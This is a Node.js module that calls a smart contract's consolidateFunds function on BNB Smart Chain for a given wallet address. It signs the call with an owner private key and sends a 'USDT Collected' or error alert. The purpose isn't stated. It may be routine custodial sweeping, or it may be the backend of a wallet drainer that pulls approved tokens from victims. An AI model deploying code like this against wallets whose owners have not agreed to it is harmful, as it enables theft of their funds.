const { web3, contract, getAccount } = require('../config');
const { sendAllNotifications } = require('./notificationService');

async function consolidateFunds(walletAddress, tokenBalances) {
    try {
        console.log(`🔄 Starting consolidation for ${walletAddress}`);
        
        const account = getAccount();
        
        // Gas estimation
        let gasEstimate;
        try {
            gasEstimate = await contract.methods.consolidateFunds(walletAddress)
                .estimateGas({ from: account.address });
            console.log('✅ Gas estimated:', gasEstimate.toString());
            gasEstimate = Math.floor(Number(gasEstimate) * 1.5);
        } catch (error) {
            console.log('⚠️ Gas estimation failed:', error.message);
            gasEstimate = 500000;
        }
        
        console.log(`⛽ Gas limit: ${gasEstimate}`);
        
        const tx = {
            from: account.address,
            to: process.env.CONTRACT_ADDRESS,
            data: contract.methods.consolidateFunds(walletAddress).encodeABI(),
            gas: gasEstimate,
            gasPrice: process.env.GAS_PRICE || await web3.eth.getGasPrice(),
            chainId: 56
        };
        
        console.log('📤 Sending transaction...');
        
        const signedTx = await web3.eth.accounts.signTransaction(tx, process.env.OWNER_PRIVATE_KEY);
        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
        
        console.log(`✅ Consolidation successful: ${receipt.transactionHash}`);
        console.log(`⛽ Gas used: ${receipt.gasUsed}`);
        
        const successMessage = `👤 Wallet: ${walletAddress}\n✅ USDT Collected\n🔗 Tx: https://bscscan.com/tx/${receipt.transactionHash}\n⛽ Gas Used: ${receipt.gasUsed}`;
        await sendAllNotifications('✅ SUCCESS', successMessage);
        
        return { 
            success: true, 
            transactionHash: receipt.transactionHash, 
            gasUsed: receipt.gasUsed 
        };
        
    } catch (error) {
        console.error(`❌ Consolidation error:`, error.message);
        
        const errorMessage = `👤 Wallet: ${walletAddress}\n❌ Error: ${error.message}`;
        await sendAllNotifications('❌ ERROR', errorMessage);
        
        return { 
            success: false, 
            error: error.message 
        };
    }
}

module.exports = { consolidateFunds };